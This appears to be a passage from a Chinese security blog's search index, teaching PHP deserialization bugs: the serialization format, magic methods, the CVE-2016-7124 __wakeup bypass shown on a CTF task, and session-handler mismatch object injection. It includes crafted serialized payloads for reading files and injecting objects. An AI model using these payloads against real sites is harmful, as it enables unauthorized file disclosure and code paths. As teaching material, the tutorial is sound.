<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>PHP反序列化漏洞</title>
    <link href="/2022/04/16/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <url>/2022/04/16/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<p>学习一下PHP反序列化漏洞。</p><span id="more"></span><hr><h3 id="0x00序列化与反序列化"><a href="#0x00序列化与反序列化" class="headerlink" title="0x00序列化与反序列化"></a>0x00序列化与反序列化</h3><h4 id="基本概念介绍"><a href="#基本概念介绍" class="headerlink" title="基本概念介绍"></a>基本概念介绍</h4><p>首先，什么是序列化与反序列化？</p><p>程序要处理数据，总要让数据有个规范吧，方便数据的存储与转移。而业务要求这么广，需要处理的数据千奇百怪，怎么规范一下呢，这就是通过序列化来实现的。</p><p><strong>序列化就是将一个对象转换成字符串</strong>（php中即通过serialize()函数），字符串就方便处理了。而这字符串就代表了经历序列化处理之前的那个对象。想也知道，这串字符串就必须含有对象的一些“特点”，包括了这个对象的<strong>属性名、属性值、属性类型和对象对应的类名</strong>，注意序列化不保存方法。</p><p>而<strong>反序列化就是将这串字符串还原为对象</strong>。</p><table><thead><tr><th align="left">类型</th><th align="left">过程</th></tr></thead><tbody><tr><td align="left">序列化</td><td align="left">对象—&gt; 字符串</td></tr><tr><td align="left">反序列化</td><td align="left">字符串—&gt;对象</td></tr></tbody></table><p><em>也可以对数组进行序列化与反序列化操作</em></p><h4 id="代码实例演示"><a href="#代码实例演示" class="headerlink" title="代码实例演示"></a>代码实例演示</h4><p>现有a.php，代码如下</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">person</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$sex</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span>; <br>    &#125;<br>    <span class="hljs-variable">$npc1</span>=<span class="hljs-keyword">new</span> person(); <span class="hljs-comment">//实例化一个对象</span><br>    <span class="hljs-variable">$npc1</span>-&gt;sex=<span class="hljs-string">&#x27;man&#x27;</span>;<br>    <span class="hljs-variable">$npc1</span>-&gt;name=<span class="hljs-string">&#x27;eggs&#x27;</span>;<br>    <span class="hljs-variable">$npc1</span>-&gt;age=<span class="hljs-number">9</span>;<br>    <span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$npc1</span>);<br>    <br><span class="hljs-meta">?&gt;</span><br><br></code></pre></div></td></tr></table></figure><p>这里定义了一个<code>person</code>类，实例化了一个<code>npc1</code>对象，赋予其一些属性值，将其序列化后输出。</p><p><code>O:6:&quot;person&quot;:3:&#123;s:3:&quot;sex&quot;;s:3:&quot;man&quot;;s:4:&quot;name&quot;;s:4:&quot;eggs&quot;;s:3:&quot;age&quot;;i:&quot;9&quot;;&#125;</code></p><p>在这串输出结果中，</p><ul><li><p><code> O</code>，代表对象，因为这里序列化的是一个对象，如果序列化的是数组的话，这里为A</p></li><li><p><code>6</code>，代表类的长度为6个字符，这里即是<code>person</code></p></li><li><p><code>&quot;person&quot;</code>，代表类名为<code>person</code></p></li><li><p><code>3</code>，代表类中有3个属性</p></li><li><p><code>s</code>，代表属性的类型为字符串<code>string</code>，<code>i</code>则代表类型为<code>int</code></p></li><li><p><code>3</code>，代表属性名长度为3。</p><blockquote><p>需要注意的是变量受到不同修饰符（public，private，protected）修饰进行序列化时，序列化后变量的长度和名称会发生变化。</p><p>public修饰的为正常长度，private修饰的会在属性两侧加入空字节<code>\00</code>，长度加2，protected修饰的会在属性前加入<code>\00*\00</code>，长度加3。</p></blockquote></li><li><p><code>&quot;sex&quot;</code>，代表属性名为<code>sex</code>，而后面的<code>&quot;man&quot;</code>代表属性值为<code>man</code>。虽然属性的名称和属性的值表示方法一样，但连在一起仍能体现键值对的关系</p></li></ul><p>将刚才得到的序列化后的字符串通过<code>unserialize()</code>反序列化，又能得到原对象。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220416155515.png"></p><h3 id="0x01魔术方法"><a href="#0x01魔术方法" class="headerlink" title="0x01魔术方法"></a>0x01魔术方法</h3><p>满足条件自动调用的方法为魔术方法，形式为左边两条下划线，<code>__xxx</code>。</p><p>在PHP中进行序列化与反序列化操作时，往往会触发一些魔术方法。这些魔术方法本意是用干预序列化和反序列化流程和结果的，但攻击者可以通过检查方法魔术方法里有无敏感操作，从而进行利用。</p><h4 id="魔术方法一览"><a href="#魔术方法一览" class="headerlink" title="魔术方法一览"></a>魔术方法一览</h4><p>PHP反序列化漏洞中可能会用到的魔术方法：</p><ul><li><p>__sleep() 序列化时触发，详见下文</p></li><li><p>__wakeup() 反序列化时触发，详见下文</p></li><li><p>__toString() 被当作字符串处理时触发，详见下文</p></li><li><p>__construct() 创建对象时触发</p></li><li><p>__destruct() 销毁对象时触发</p></li><li><p>__call() 在对象上下文中调用不可访问的方法时触发</p></li><li><p>__callStatic() 在静态上下文中调用不可访问的方法时触发</p></li><li><p>__get() 用于从不可访问的属性读取数据</p></li><li><p>__set() 用于将数据写入不可访问的属性</p></li><li><p>__unset() 在不可访问的属性上使用unset()时触发</p></li><li><p>__invoke() 当脚本尝试将对象调用为函数时触发</p></li></ul><h4 id="重点魔术方法"><a href="#重点魔术方法" class="headerlink" title="重点魔术方法"></a>重点魔术方法</h4><ul><li><p>__sleep() </p><p>serialize() 函数会检查类中是否存在魔术方法 __sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。__sleep()返回一个数组，只有该数组中的元素会进行序列化操作。实例如下：</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220416165615.png"></p><p>可以看到__sleep()返回的属性名是不会进行序列化操作的，其它属性进行序列化操作。</p></li><li><p>__wakeup() </p><p>unserialize() 会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源，返回void。常用于反序列化操作中重新建立数据库连接或执行其它初始化操作。实例：</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220416191620.png"></p><p>就是在调用unserialize()时调用__wakeup()中的内容</p></li><li><p>toString() 当一个对象被当作一个字符串时被调用，返回字符串，例如echo打印出对象就会调用此方法。实例：</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220416192133.png">触发__toString里的方法，并返回一串字符串作为触发该方法的输入（因为这是被当作字符串处理才会触发的方法嘛)。</p></li><li><p>__construct()和__destruct()也较常拿来利用，比较简单，一个在创建对象时触发（但执行反序列化时，生成的对象<strong>并不会</strong>触发），一个在销毁对象（流程：反序列化生成一个对象，程序执行完毕，对象自动销毁）时触发，不再赘述</p></li></ul><h3 id="0x02绕过-wakeup"><a href="#0x02绕过-wakeup" class="headerlink" title="0x02绕过__wakeup()"></a>0x02绕过__wakeup()</h3><p><strong>CVE-2016-7124 版本限制：<code>PHP5:&lt;5.6.25</code> <code>PHP7:&lt;7.0.10</code></strong></p><p>一道来自吸提爱富中的例题</p><p>反序列化时，如果表示对象属性个数的值大于真实的属性个数时就会跳过<code>__wakeup( )</code>的执行。</p><p>例题：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    error_reporting(<span class="hljs-number">0</span>);<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">secret</span></span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$file</span>=<span class="hljs-string">&#x27;index.php&#x27;</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;file=<span class="hljs-variable">$file</span>;<br>        &#125;<br><br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">echo</span> show_source(<span class="hljs-keyword">$this</span>-&gt;file,<span class="hljs-literal">true</span>);<br>        &#125;<br><br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;file=<span class="hljs-string">&#x27;index.php&#x27;</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-variable">$cmd</span>=cmd00;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-variable">$cmd</span>]))&#123;<br>        <span class="hljs-keyword">echo</span> show_source(<span class="hljs-string">&#x27;index.php&#x27;</span>,<span class="hljs-literal">true</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$cmd</span>=base64_decode(<span class="hljs-variable">$_GET</span>[<span class="hljs-variable">$cmd</span>]);<br>        <span class="hljs-keyword">if</span> ((preg_match(<span class="hljs-string">&#x27;/[oc]:\d+:/i&#x27;</span>,<span class="hljs-variable">$cmd</span>))||(preg_match(<span class="hljs-string">&#x27;/flag/i&#x27;</span>,<span class="hljs-variable">$cmd</span>)))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Are u gaoshing?&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            unserialize(<span class="hljs-variable">$cmd</span>);<br>        &#125;<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//secret in the_next.php</span><br></code></pre></div></td></tr></table></figure><p>源码看一下，可以知道前半截定义了一个<code>sercet</code>类，其中有__construct()、__destruct()、__wakeup()方法。我们需要构造一个序列化字符串上传，在这里如果我们想要看到指定文件的源码，就需要利用__destruct()方法，而该方法在程序完成时会自动触发的。又根据末尾的注释提示，这要求我们所构造的反序列化字符串中的<code>file</code>属性值为<code>the_next.php</code>。但是又因为存在__wakeup()函数，导致在序列化后触发该函数，我们构造的参数变成了<code>index.php</code>，文件读取失败。所以这里的关键即是执行反序列化时绕过__wakeup()的执行。</p><p>强调一下知识点：<strong>反序列化时，如果表示对象属性个数的值大于真实的属性个数时就会跳过<code>__wakeup( )</code>的执行</strong></p><p>所以，我们先复制一下这个<code>secret</code>的定义，new一个对象使其属性值为<code>the_next.php</code>，然后再生成一下该对象的的序列化字符串。</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  error_reporting(<span class="hljs-number">0</span>); <br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">secret</span></span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$file</span>=<span class="hljs-string">&#x27;index.php&#x27;</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;file=<span class="hljs-variable">$file</span>;<br>        &#125;<br><br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">echo</span> show_source(<span class="hljs-keyword">$this</span>-&gt;file,<span class="hljs-literal">true</span>);<br>        &#125;<br><br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;file=<span class="hljs-string">&#x27;index.php&#x27;</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-variable">$payload</span>=<span class="hljs-keyword">new</span> secret(<span class="hljs-string">&quot;the_next.php&quot;</span>);<br>    <span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$payload</span>);<br>    <br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><p>生成的序列化字符串为</p><p><code>O:6:&quot;secret&quot;:1:&#123;s:12:&quot;secretfile&quot;;s:12:&quot;the_next.php&quot;;&#125;</code></p><p>为了使其绕过__wakeup()，改为</p><p><code>O:6:&quot;secret&quot;:2:&#123;s:12:&quot;secretfile&quot;;s:12:&quot;the_next.php&quot;;&#125;</code></p><p>至于后半截，我们上传的参数为<code>cmd</code>，需要base64加密再用<code>+</code>绕过正则就可以了，这里不是重点不再赘述。</p><h3 id="0x03PHP-session反序列化漏洞"><a href="#0x03PHP-session反序列化漏洞" class="headerlink" title="0x03PHP session反序列化漏洞"></a>0x03PHP session反序列化漏洞</h3><p>在讨论session反序列化漏洞之前，我们先补充一下有关PHP session的知识</p><p><em>该章节部分来自<a href="https://xz.aliyun.com/t/6640#toc-1">https://xz.aliyun.com/t/6640#toc-1</a></em> <em>并整合了一些我个人理解。</em></p><h4 id="PHP-session相关"><a href="#PHP-session相关" class="headerlink" title="PHP session相关"></a>PHP session相关</h4><h6 id="PHP-session介绍"><a href="#PHP-session介绍" class="headerlink" title="PHP session介绍"></a>PHP session介绍</h6><p><code>session</code>一般称为“会话控制“，简单来说就是是一种客户与网站/服务器更为安全的对话方式。一旦开启了 <code>session</code> 会话，便可以在网站的任何页面使用或保持这个会话，从而让访问者与网站之间建立了一种“对话”机制。不同语言的会话机制可能有所不同，这里仅讨论<code>PHP session</code>机制。</p><p><code>PHP session</code>可以看做是一个特殊的变量，且该变量是用于存储关于用户会话的信息，或者更改用户会话的设置，需要注意的是，<code>PHP Session</code> 变量存储单一用户的信息，并且对于应用程序中的所有页面都是可用的，且其对应的具体 <code>session</code> 值会存储于服务器端，这也是与 <code>cookie</code>的主要区别，所以<code>seesion</code> 的安全性相对较高</p><h6 id="PHP-session-的工作流程"><a href="#PHP-session-的工作流程" class="headerlink" title="PHP session 的工作流程"></a>PHP session 的工作流程</h6><p>当开始一个会话时，PHP会尝试从请求中查找会话ID（通常通过会话<code>cookie</code>，然后是<code>Get</code>、<code>Pos</code>t中），如果不存在则开启会话，生成session文件来完成”会话控制“，如果存在，则表示之前已经开启过会话了，PHP就会根据这个ID找到session文件，<strong>反序列化</strong>该文件来读取数据，以此完成”会话控制“。</p><p>我们需要关注的重点在于怎么生成session文件，以及该文件是怎么存储保存的（剧透：刚刚说了通过反序化读取，那么就是通过序列化的方式保存）。</p><p>回到会话开始时，没有sessionID的情况。PHP此时会自动调用<code>php_session_create_id</code>函数创建一个新的会话，并且在<code>http response</code>中通过<code>set-cookie</code>头部发送给客户端保存。</p><p><em>微博🐶都不用，我之前自然是没有与它建立会话的（玩笑而已不必当真，花花世界迷人眼，寸寸屏幕乱我心）。</em>所以我这里抓取了我登录微博时的数据包。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220416214023.png"></p><p>可以看到在response报文中看到<code>set-cookie</code>头部</p><p><em>有时候浏览器用户设置会禁止 <code>cookie</code>，当在客户端<code>cookie</code>被禁用的情况下，php也可以自动将<code>session id</code>添加到url参数中以及<code>form</code>的<code>hidden</code>字段中，但这需要将<code>php.ini</code>中的<code>session.use_trans_sid</code>设为开启，也可以在运行时调用<code>ini_set</code>来设置这个配置项。</em></p><p>会话开始后，这也就是PHP SESSION发挥作用的时候，这时让会将会话中的数据设置到 <code>$_SESSION</code> 之中，方便数据读取。</p><p>如下述代码就是一个在 <code>$_SESSION</code> 变量中注册变量的例子</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>session_start();<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>])) &#123;<br>  <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-string">&#x27;xianzhi&#x27;</span> ;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><p>接下来是“善后阶段”，也就是<code>$_SESSION</code> 用完了，要保存起来方便下次直接用。</p><p>会话停止后，PHP 就会自动读取<code>$_SESSION</code>中的内容，并将其进行<strong>序列化</strong>，然后发送给会话保存管理器来进行保存。</p><p>默认情况下，PHP 使用内置的文件会话保存管理器来完成<code>session</code>的保存，也可以通过配置项 <code>session.save_handler</code> 来修改所要采用的会话保存管理器。 对于文件会话保存管理器，会将会话数据保存到配置项<code>session.save_path</code>所指定的位置。</p><p>整个流程大概如上所述，也可参考下述流程图：</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220416215209.png"></p><h6 id="PHP-session存储的相关配置"><a href="#PHP-session存储的相关配置" class="headerlink" title="PHP session存储的相关配置"></a>PHP session存储的相关配置</h6><p>从上文中我们可以得知，PHP在session存储和读取时,都会有一个序列化和反序列化的过程。在php.ini中有以下配置项，决定了如何执行序列化相关操作。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220417143356.png"></p><p><code>session.save_path</code> 设置session的存储路径<br><code>session.save_handler</code> 设定用户自定义存储函数<br><code>session.auto_start</code> 指定会话模块是否在请求开始时启动一个会话<br><code>session.serialize_handler</code> 定义用来序列化/反序列化的处理器名字。默认使用php</p><p>除了默认的session序列化引擎php外，还有几种引擎，不同引擎存储方式不同</p><table><thead><tr><th>处理器名称</th><th>存储格式</th></tr></thead><tbody><tr><td>php</td><td>键名 + 竖线 + 经过<code>serialize()</code>函数序列化处理的值</td></tr><tr><td>php_binary</td><td>键名的长度对应的 ASCII 字符 + 键名 + 经过<code>serialize()</code>函数序列化处理的值</td></tr><tr><td>php_serialize</td><td>经过serialize()函数序列化处理的<strong>数组</strong></td></tr></tbody></table><p><code>PHP session</code>默认是以文件的方式存储，且存储的文件是由<code>sess_sessionid</code>来决定文件名的。当然，文件的内容始终是session值的序列化之后的内容。</p><h6 id="PHP-session的存储机制"><a href="#PHP-session的存储机制" class="headerlink" title="PHP session的存储机制"></a>PHP session的存储机制</h6><p>上文中提到了 <code>PHP session</code>的存储机制是由<code>session.serialize_handler</code>来定义引擎的，下面我们实例来看看三种不同处理器序列化后的结果</p><p>测试demo.php：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <span class="hljs-comment">// ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php&#x27;);</span><br> <span class="hljs-comment">// ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_binary&#x27;);</span><br> <span class="hljs-comment">// ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_serialize&#x27;);</span><br> <span class="hljs-comment">// 修改对应设置来改变序列化引擎</span><br>    session_start();<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;test&#x27;</span>] = <span class="hljs-string">&#x27;eggs&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><p><strong>PHP引擎</strong></p><p>序列化<code> $_SESSION[&#39;test&#39;] = &#39;eggs&#39;</code>的结果为<code>test|s:4:&quot;eggs&quot;;</code></p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220417145044.png"></p><p><strong>php_binary引擎</strong></p><p>序列化<code> $_SESSION[&#39;test&#39;] = &#39;eggs&#39;</code>的结果为<code>EOTtests:4:&quot;eggs&quot;;</code></p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220417145905.png"></p><p>注意这个<code>EOT</code>是 值为4，等于键名<code>test</code>的字符长度。</p><p>该值为不可打印的ASCII 字符字符，如果将键名长度换成其它长度的话结果如下</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220417150248.png"></p><p>第一个值为H，表示键名长度为72</p><p><strong>php_serialize引擎</strong></p><p>序列化<code> $_SESSION[&#39;test&#39;] = &#39;eggs&#39;</code>的结果为<code>a:1:&#123;s:4:&quot;test&quot;;s:4:&quot;eggs&quot;;&#125;</code></p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220417150619.png"></p><p>这种形式与之前在普通PHP文件里进行的序列化结果一样。</p><h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><h5 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h5><p><code>php</code>处理器和<code>php_serialize</code>处理器这两个处理器生成的序列化格式本身是没有问题的，但是如果这两个处理器混合起来用，就会造成危害。</p><p>形成的原理就是在用<code>session.serialize_handler = php_serialize</code>存储的字符中加上<code> |</code> , 再用<code>session.serialize_handler = php</code>格式取出<code>$_SESSION</code>的值时， <code>|</code>会被当成键值对的分隔符，在特定的地方会造成反序列化漏洞。</p><h5 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h5><p>定义一个<code>session.php</code>文件，用于传入 <code>session</code>值，文件内容如下：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    error_reporting(<span class="hljs-number">0</span>);<br>    ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>,<span class="hljs-string">&#x27;php_serialize&#x27;</span>);<br>    session_start();<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;session&#x27;</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;session&#x27;</span>];<br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><p><code>session.php</code>文件的处理器是<code>php_serialize</code></p><p>我们访问该页面可以往<code>$_SESSION</code>中传入值</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220417155548.png"></p><p>这里没有传入值，所以为N（空）</p><p>存在另一个<code>a.php</code> 文件，内容如下：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br>   error_reporting(<span class="hljs-number">0</span>);<br>   ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>,<span class="hljs-string">&#x27;php&#x27;</span>);<br>   session_start();<br>   <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">sayhi</span></span>&#123;<br>      <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;eggs&#x27;</span>;<br>      <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Who are you?&quot;</span>;<br>      &#125;<br>      <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>.<span class="hljs-keyword">$this</span>-&gt;name;<br>      &#125;<br>   &#125;<br>  <span class="hljs-variable">$npc</span> = <span class="hljs-keyword">new</span> sayhi();<br> <span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><p><code>a.php</code>文件的处理器是<code>php</code></p><p><code>a.php</code>文件的作用是在类<code>sayhi</code>反序列化开始前输出<code>Who are you?</code>，进程结束的时候输出<code>name</code>值。</p><p>而这个文件只会在<code>session_start()</code>时，对session文件进行序列化以及反序列化操作，而定义的<code>sayhi</code>类是不会进行反序列化操作的,没有触发魔术方法<code>__wakeup()</code>，所以直接访问时只后出现<code>echo name</code></p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220417155819.png"></p><h5 id="触发漏洞"><a href="#触发漏洞" class="headerlink" title="触发漏洞"></a>触发漏洞</h5><p><strong>这个漏洞的点就在于，我们使PHP对session文件进行反序列化时，让PHP还原的类除了session文件，也包括我们传入的参数</strong></p><p>解释如下</p><p>正常情况下，当我们访问a.php，并上传一些参数时<code>http://127.0.0.1/session.php?session=123</code></p><p>生成的session文件：</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220417162604.png"></p><p>session内容：</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220417162539.png"></p><p>也就是说，本来访问<code>a.php</code>,<code>session_start()</code>执行时，会将session文件进行反序列化，反序化的字符串是这样<code>a:1:&#123;s:7:&quot;session&quot;;s:3:&quot;123&quot;;&#125;</code>。这是很正常的session文件。</p><p>但如果我们访问session.php时，使输入的参数为<code>|</code>，后面加上sayhi类的序列化后字符串，那么之后我们再访问a.php时，流程是怎么样的呢？</p><p>先在payload.php中生成sayhi类的序列化后的字符串</p><p>payload.php</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>   <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">sayhi</span></span>&#123;<br>      <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>      <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Who are you?&quot;</span>;<br>      &#125;<br>      <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>.<span class="hljs-keyword">$this</span>-&gt;name;<br>      &#125;<br>   &#125;<br>  <span class="hljs-variable">$payload</span> = <span class="hljs-keyword">new</span> sayhi();<br>  <span class="hljs-variable">$payload</span>-&gt;name= <span class="hljs-string">&#x27;pig&#x27;</span>;<br>  <span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$payload</span>);<br> <span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><p>获得该类的序列化字符串：</p><p><code>O:5:&quot;sayhi&quot;:1:&#123;s:4:&quot;name&quot;;s:3:&quot;pig&quot;;&#125;</code></p><p>然后在该字符串前面加上<code>|</code>，作为参数传入<code>session.php</code></p><p><img 